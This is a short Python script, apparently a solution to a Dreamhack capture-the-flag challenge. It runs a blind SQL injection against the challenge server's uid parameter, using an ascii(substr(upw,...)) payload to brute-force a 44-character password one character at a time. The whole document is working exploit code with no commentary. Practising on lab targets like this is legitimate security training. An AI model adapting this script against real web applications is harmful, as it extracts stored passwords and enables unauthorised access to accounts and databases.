import requests
url = 'http://host3.dreamhack.games:20067/?uid='

pw_data = ''
for i in range(1,44+1):
    for j in range(33,128):
        r = requests.get(url + f"'||ascii(substr(upw,{i},1))={j}%23")
        print(pw_data)
        if 'admin' in r.text:
            pw_data += chr(j)
            break

print(pw_data)